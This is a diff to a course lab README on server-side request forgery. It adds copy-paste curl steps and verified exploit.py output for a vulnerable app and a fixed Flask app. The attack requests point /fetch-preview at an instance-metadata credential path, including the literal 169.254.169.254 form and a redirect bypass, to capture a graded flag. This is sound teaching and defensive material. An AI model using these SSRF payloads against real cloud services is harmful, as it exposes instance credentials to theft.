@@ -63,6 +63,53 @@ Two Flask targets, same two endpoints, one difference in `/fetch-preview`:
    external-shaped URL still works normally. That's the empirical proof that the fix is a targeted
    allowlist/blocklist decision, not "fetching is now broken."
 
+## Step-by-step (copy these commands)
+Run these in a terminal inside this lab folder: Terminal on macOS or Linux, or **Git Bash** on
+Windows (it comes with Git). Each step says what you should see.
+
+0. **Your personal flag:** save the `.env` file from your Classroom private comment in this folder
+   first (see "Your personal flag" below). Without it you capture the shared placeholder flag,
+   which earns no marks.
+1. **Start both apps.** The first run downloads and builds the image, so it can take a few
+   minutes.
+   ```bash
+   docker compose up -d --build
+   ```
+   When it finishes, wait about 10 seconds for the apps to start.
+2. **Check that both apps are running.** If you see only `HTTP 000`, the apps are still starting:
+   wait a few seconds and run the command again.
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8104/ping
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8117/ping
+   ```
+   You should see `{"mode":"vulnerable","status":"ok"}` and then `{"mode":"fixed","status":"ok"}`,
+   each followed by `HTTP 200`.
+3. **Normal use:** ask the vulnerable app to fetch an ordinary page.
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' -X POST http://localhost:8104/fetch-preview -H 'Content-Type: application/json' -d '{"url": "http://vulnerable:5000/ping"}'
+   ```
+   You should see `"status":"fetched"` and `HTTP 200`. The feature works as designed.
+4. **The attack:** ask the vulnerable app to fetch its own metadata route for you.
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' -X POST http://localhost:8104/fetch-preview -H 'Content-Type: application/json' -d '{"url": "http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole"}'
+   ```
+   You should see `HTTP 200` and a `body` holding fake `AccessKeyId`, `SecretAccessKey` and
+   `Token` values plus `\"flag\":\"FLAG{...}\"`. That flag is yours: copy it into the worksheet,
+   together with the `-d '...'` request body you sent.
+5. **The same attack on the fixed app:**
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' -X POST http://localhost:8117/fetch-preview -H 'Content-Type: application/json' -d '{"url": "http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole"}'
+   ```
+   You should see `{"error":"blocked","reason":"internal/metadata URL not allowed",...}` and
+   `HTTP 403`, with no flag.
+6. **Stop the apps when you finish.**
+   ```bash
+   docker compose down
+   ```
+
+If a step doesn't match, check that Docker Desktop is running and that you are in this lab
+folder, then ask in class.
+
 ## Run it
 ```bash
 cd {{ labpath }}
@@ -70,11 +117,15 @@ docker compose up -d --build   # vulnerable_app.py on :8104, fixed_app.py on :81
 python3 -m pip install requests           # once, on the host
 python3 exploit.py
 ```
-Expect two `PASS` lines and exit `0`: a successful self-SSRF that leaks the flag on `:8104`, a
-rejected self-SSRF (no flag) on `:8117`.
+`exploit.py` runs the same checks in one go (an optional self-check, not a replacement for the
+steps above). Expect five `PASS` lines and exit `0`: the self-SSRF leaks the flag on `:8104`; on
+`:8117` it is rejected, and so are the literal `169.254.169.254` form and a redirect-based
+bypass, while an ordinary URL still fetches.
 
-**Verified:** `docker compose up -d --build` was run on this machine; `exploit.py` ran from the
-host against the published ports. Real captured output:
+**Verified (2026-11-02):** `docker compose up -d --build` was run on this machine, every command
+in Step-by-step was run as written (Step 0 was tested with a stand-in `.env`, and the captured flag
+changed to its value), and `exploit.py` ran from the host against the published ports. Real
+captured output of `exploit.py`, flag value masked:
 ```
 === VULNERABLE (no URL validation on /fetch-preview) (http://localhost:8104) ===
 [*] POST /fetch-preview url=http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole
@@ -85,12 +136,17 @@ PASS: SSRF via /fetch-preview leaked instance-role credentials, flag = FLAG{...}
 [*] POST /fetch-preview url=http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole
     -> 403 {'error': 'blocked', 'reason': 'internal/metadata URL not allowed', 'url': 'http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole'}
 PASS: fixed app correctly REJECTED the SSRF attempt (403), no flag leaked
+
+PASS: fixed app also rejects the literal 169.254.169.254 payload (403)
+
+PASS: fixed app still fetches an ordinary external-shaped URL (not a blanket failure)
+
+=== FIXED — redirect bypass (http://localhost:8117) ===
+[*] POST /fetch-preview url=http://host.docker.internal:<port>/ (redirects to http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole)
+    -> 403 {'error': 'blocked', 'reason': 'redirect target not allowed', 'url': 'http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole'}
+PASS: fixed app correctly REJECTED the redirect-based bypass (403), no flag leaked
 ```
-Exit code `0`. Negative controls confirmed separately: the fixed app still successfully fetches an
-ordinary external-shaped URL (`http://vulnerable:5000/ping`, ordinary container-to-container
-traffic) — the fix is a targeted block, not a blanket failure — and also rejects the literal
-`http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole` payload form, matching
-the real-world IMDS attack string students will recognize from public write-ups.
+Exit code `0`. The `<port>` in the redirect line is a random free port on each run.
 
 **Port note:** the task brief for this lesson suggested `:8104`/`:8105`, but `:8105` is already
 in use by this repo's `lesson05-s3-static-site-lambda-sns` lab (built concurrently). This lesson
